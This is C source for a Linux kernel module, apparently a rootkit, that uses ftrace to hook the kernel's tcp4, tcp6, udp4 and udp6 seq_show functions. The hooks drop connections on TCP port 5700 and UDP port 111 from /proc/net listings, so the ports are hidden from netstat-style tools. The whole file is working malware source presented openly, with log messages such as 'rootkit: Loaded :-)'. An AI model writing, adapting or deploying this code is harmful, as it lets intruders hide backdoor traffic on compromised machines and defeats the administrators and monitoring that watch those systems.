#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/tcp.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

#include "ftrace_helper.h"

static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_udp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(5700);

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(5700);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_tcp6_seq_show(seq, v);
}

static asmlinkage int hook_udp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(111);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_udp4_seq_show(seq, v);
}

static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(111);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_udp6_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hook_udp6_seq_show, &orig_udp6_seq_show),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) 
        return err;
    
    printk(KERN_INFO "rootkit: Loaded :-)\n");

    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("hide port");
MODULE_VERSION("0.01");